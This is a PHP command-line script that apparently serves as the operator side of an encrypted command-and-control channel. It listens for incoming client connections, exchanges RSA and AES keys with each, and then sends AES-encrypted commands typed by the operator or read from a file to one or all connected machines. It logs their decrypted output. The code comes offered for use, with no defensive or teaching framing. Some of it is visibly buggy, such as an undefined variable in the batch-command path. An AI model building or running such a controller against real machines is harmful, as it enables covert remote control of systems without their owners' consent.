#!/usr/bin/php -d memory_limit=2048M
<?php
	/** $ php -r "echo base64_encode(openssl_random_pseudo_bytes(32));" > .env */
	/**
	 * SOCKET/STREAM SELECT
	 * --------------------------------------------
	 * tv_sec  - num of seconds		 - 0.2
	 * tv_usec - num of microseconds - 500000 = 0.5
	 * --------------------------------------------
	 */
	ob_implicit_flush(1);
	define("DELIMITER", "----------------------------------------");
	define("LOGFILE",".log");
	define("BUFFER_LEN", 4096);
	define("STREAM_BUFFER_LEN", 1024);

	$opts = getopt("h:p:", ["host:", "port:"]);
	$log = $err = '';
	$openssl_dest_path = './OpenSSL_Enc_Dec.php';

	(count($opts) === 2) || die("[\33[91m!\33[0m] assign remote ip [-h/--host], port [-p/--port]\n");
	$host_addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$host_port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);

	($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
	|| die("[\33[91m!\33[0m] socket_create() error: "
			.socket_strerror(socket_last_error())."\n");

	socket_set_nonblock($master_sock);
	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);

	(socket_bind($master_sock, $host_addr, (int)$host_port))
	|| die("[\33[91m!\33[0m] socket_bind() error: "
			.socket_strerror(socket_last_error($master_sock))."\n");

	(socket_listen($master_sock))
	|| die("[\33[91m!\33[0m] socket_listen() error: "
			.socket_strerror(socket_last_error($master_sock))."\n");
	
	if(file_exists($openssl_dest_path)){
		require_once $openssl_dest_path;
		$openssl_enc_dec = new OpenSSL_Enc_Dec;
		unset($openssl_dest_path);
	} else { die("[\33[91m!\33[0m] error: openssl class is missing."); }
	
	$log = "host [".$host_addr.":".$host_port."] listening for incomming connections..\n\n";
	write_log(LOGFILE, $log);
	echo $log;

	$clients = [$master_sock];
	$connected = $write = $recv = [];
	$except = null;
	/** stream_select() args => always null => only $_read used for stdin **/
	$_write  = null;
	$_except = null;

	while (1) {
	    /** create a copy, so $clients doesn't get modified by socket_select() **/
		$write = $recv = $clients;
		$now = date('Y-m-d H:i:s');

	    if(socket_select($recv, $write, $except, null) === false){
			$err = "[\33[91m!\33[0m] socket_select() error: ".socket_strerror(socket_last_error($master_sock))."\n";
			write_log(LOGFILE, $err);
			echo $err;
		}

	    if(in_array($master_sock, $recv))
	    {
			// socket_accept => false also indicates "no data"
			if(($recv_sock = socket_accept($master_sock)) === false) {
				if(socket_last_error($master_sock) !== 0){
					$err = "[\33[91m!\33[0m] socket_accept() error: ".socket_last_error().': '.socket_strerror(socket_last_error())."\n";
					write_log(LOGFILE, $err);
					echo $err;
				}
				// master_socket 0 => no error => no data => do nothing
			}
			if($recv_sock instanceof Socket)
			{ 
				$clients[] = $recv_sock;
				socket_getpeername($recv_sock, $ip, $port);
				write_log(LOGFILE, "[".$ip.":".$port."] connected.\n");
				echo "[".$now."] [\33[91m!\33[0m] [".gethostbyaddr($ip).":".$ip.":".$port."] connected.\n";

				if(false === ($meta = generate_metadata())){
					$err = "[\33[91m!\33[0m] error generating metadata.\n";
					write_log(LOGFILE, $err);
					echo $err;
				}
				/** final format: base64glued => $signature.$encryptedAESKey.$RSAPubStripped */
				if(socket_send($recv_sock, $meta['base64glued'], strlen($meta['base64glued']), MSG_EOF) === false){
					$err = "[\33[91m!\33[0m] write error: ".socket_strerror(socket_last_error($recv_sock))."\n";
					write_log(LOGFILE, $err);
					echo $err;
				}
				$connected [] = [
					'host'  => gethostbyaddr($ip),
					'ip'    => $ip,
					'port'  => $port,
					'socket'  => $recv_sock,
					'token' => $meta['token']
				];
				// remove the listening socket from the clients-with-data array
				$recv_key = array_search($clients, $recv);
				unset($recv[$recv_key]);
			}

			//var_dump($recv,$write,$clients);

			if(!empty($recv))
			{
				foreach ($recv as $k => $recv_socket)
				{
					socket_clear_error($recv_socket);
					if(false === @socket_getpeername($recv_socket, $ip, $port))
					{
						$err = "[\33[91m!\33[0m] socket_getpeername error: ".socket_strerror(socket_last_error())."\n";
						write_log(LOGFILE, $err);
						echo $err;
						$_k = array_search($recv_socket, array_map(function($c) use ($recv_socket) {
														return in_array((object)$recv_socket, $c, true);
													}, $connected));
						unset($connected[$_k]);
						unset($clients[$k]);
						unset($write[$k]);
						unset($recv[$k]);
					} else {
						$now = date('Y-m-d H:i:s');
						$ipport = $ip.':'.$port;
						$host = gethostbyaddr($ip);
						$data = '';
						$all_bytes = 0;
						$flag_disconnected = false;
			
						while(false !== ($bytes = socket_recv($recv_socket, $buffer, BUFFER_LEN, MSG_DONTWAIT)))
						{
							$all_bytes += $bytes;
							echo $bytes !== 0 ? "\33[94mrecieved\33[0m: ".$bytes." \33[94mbytes\33[0m\n" : '';
							$lastError = socket_last_error($recv_socket);
	
							if($bytes === 0)
							{		
								if($lastError !== 0){
									$err = "socket error: ".$lastError." :: ".socket_strerror($lastError)."\n";
									write_log(LOGFILE, $err);
									echo $err;
								}
								$_key = array_search($ip,
											array_map(function($c) use ($ipport) {
												return ($c['ip'].':'.$c['port'] === $ipport);
											}, $connected));
								unset($clients[$k]);
								unset($recv[$k]);
								unset($write[$k]);
								unset($connected[$_key]);
								$flag_disconnected = true;
			
								write_log(LOGFILE, "[".$host.":".$ip.":".$port."] disconnected.\n");
								echo "[".$now."] [\33[91m!\33[0m] [".$host.":".$ip.":".$port."] disconnected.\n";
								break;
							}
							else if ($bytes > 0){
								$data .= $buffer;
							}
							else {
								if($lastError !== 0){ 
									echo "error: ".$lastError." :: ".socket_strerror($lastError)."\n";
								}
							}
						}
						if(!empty($data))
						{
							if($all_bytes > BUFFER_LEN && $flag_disconnected === false){
								$log = "\33[94moverall bytes recieved: ".$all_bytes."\33[0m\n";
								echo $log;
								write_log(LOGFILE, $log);
							}
							$temp_data = $data;
							if(($data = $openssl_enc_dec->decrypt_cbc($data)) === false){ $data = $temp_data; }
							$log = "[\33[32m".$ip."\33[0m:\33[35m".$port."\33[0m]\n".$data."\n".DELIMITER."\n";
							write_log(LOGFILE, $log);
							echo $log;
						}
					}
				}
			}
		}

		if(empty($connected)) {
			$clients = [$master_sock];
			echo "[\33[91m!\33[0m] listening..........\n";
		}

		$stdin = fopen('php://stdin', 'r');
		stream_set_blocking($stdin, 0);
		$_read = [$stdin];
		if(($result = stream_select($_read, $_write, $_except, 0.2, 500000)) !== false){
			if($result === 0)  { fclose($stdin); continue; } // no data, next iteration
			$line = stream_get_line($stdin, STREAM_BUFFER_LEN, "\n");
		} else {
			echo "[\33[91m!\33[0m] error: stream_select() error.\n";
			fclose($stdin);
			continue;
		}
		fclose($stdin);

		if(empty($line)){ continue; }
		else if($line === 'exit'){ break; }
		else if($line === 'clients'){
			display_clients($connected);
			continue;
		}
		else if($line === 'sendto'){
			display_clients($connected);
			$target = readline("ip::cmd [ or x to exit ]: ");
			if($target === 'x'){
				continue;
			}
			$target_array = explode(':',$target);
			$dst = $target_array[0];
			$dstport = intval($target_array[1]);
			$cmd = $openssl_enc_dec->encrypt_cbc($target_array[2]);
			if((empty($connected) === false) && (empty($write) === false))
			{
				foreach($connected as $conn)
				{
					if($conn['ip'] === $dst && $conn['port'] === $dstport)
					{
						$target = array_values($write)[0]; // always contains 1 element

						var_dump($target);

						if(socket_send($target, $cmd."\n", strlen($cmd), MSG_EOF) === false){
							echo "[\33[91m!\33[0m] send error: ".socket_strerror(socket_last_error($target))."\n";
						}
						break;
					}
				}
			}
		}
		else if($line === 'dcclient'){
			display_clients($connected);
			$dst = readline("ip [ or x to exit ]: ");
			if($dst === 'x'){
				continue;
			}
			$cmd = $openssl_enc_dec->encrypt_cbc('dc');
			if((empty($connected) === false) && (empty($write) === false))
			{
				foreach($connected as $conn)
				{
					if($conn['ip'] === $dst)
					{
						$target = array_values($write)[0]; // always contains 1 element

						var_dump($target);

						if(socket_send($target, $cmd."\n", strlen($cmd), MSG_EOF) === false){
							echo "[\33[91m!\33[0m] send error: ".socket_strerror(socket_last_error($target))."\n";
						}
						break;
					}
				}
			}
		}
		else if(preg_match('/^\-f{1}\s?\.{0,2}\/{1}\.{0,1}\w+\.{0,1}\w{0,3}$/', $line)){
			$file = substr($line, 3);
			if(file_exists($file))
			{
				$fp = fopen($file, 'r');
				$cmdsarr = explode("\n", fread($fp, filesize($file))); // 1 line 1 cmd
				fclose($fp);
				$full_cmd = "";
				
				foreach($cmdsarr as $cmd){ $full_cmd .= trim($cmd).';'; }
				$full_cmd = $openssl_enc_dec->encrypt_cbc($fullcmd);
				foreach($write as $send_sock)
		  		{
			        if($send_sock === $master_sock){ continue; }
			        else if(socket_send($send_sock, $full_cmd."\n", strlen($full_cmd), MSG_EOF) === false){	
						echo "[\33[91m!\33[0m] write error: ".socket_strerror(socket_last_error($send_sock))."\n";
					}	
				}
			}
			else { echo "[\33[91m!\33[0m] invalid path.\n"; }
			continue;
		}
		else { /** default send flow */
			if((empty($connected) === false) && (empty($write) === false))
			{
				$line = $openssl_enc_dec->encrypt_cbc($line);
				foreach ($write as $send_sock)
				{
					if($send_sock !== $master_sock) { /** don't write to self */
						if(socket_send($send_sock, $line."\n", strlen($line), MSG_EOF) === false){
							echo "[\33[91m!\33[0m] write error: ".socket_strerror(socket_last_error($send_sock))."\n";
						}
					}
				}
			}
		}
	}
	$log = "closing master socket..\n";
	write_log(LOGFILE,$log);
	echo $log;
	socket_close($master_sock);
	exit(0);

/***********************************************************/

function generate_metadata(){
	$openssl_enc_dec = new OpenSSL_Enc_Dec;
	$token = bin2hex(openssl_random_pseudo_bytes(16));
	
    if(false === ($tokenhash = $openssl_enc_dec->generate_keypair('master', $token))){
		return false;
	}
    if(false === ($AESKey = $openssl_enc_dec->fetch_key())){
		return false;
	}
    if(false === ($RSAKeyStrings = $openssl_enc_dec->get_keypair_strings())){
		return false;
	}

    $RSAPubStripped = str_replace('-----BEGIN PUBLIC KEY-----', '', $RSAKeyStrings['public']);
	$RSAPubStripped = str_replace('-----END PUBLIC KEY-----', '', $RSAPubStripped);
	
    if(false === ($encryptedAESKey = $openssl_enc_dec->encryptRSA($token, $AESKey, 'private'))){
		return false;
	}

	$glued = $encryptedAESKey.$RSAPubStripped;
	if(false === openssl_sign($glued, $signature, $RSAKeyStrings['private'], OPENSSL_ALGO_SHA512)){
		echo "Error generating signature.\n";
		return false;
	}

    $base64glued = base64_encode($signature.$glued);
	unset($openssl_enc_dec);

	return (1 === openssl_verify($glued, $signature, $RSAKeyStrings['public'], OPENSSL_ALGO_SHA512))
			? ['token' => $token, 'base64glued' => $base64glued]
			: false;
}

function write_log(string $file, string $str) {
	return (file_put_contents($file, '['.date('Y-m-d H:i:s').']'.$str, FILE_APPEND));
}

function display_clients(array $clients) {
	echo "\33[94mconnected clients: ".count($clients)."\33[0m\n";
	$clients = array_values($clients); // re-index
	foreach ($clients as $k => $c) { 
		echo "[{$k}]: {$c['host']}:{$c['ip']}:{$c['port']}\n"; //:{$c['token']}
	}
	return;
}
?>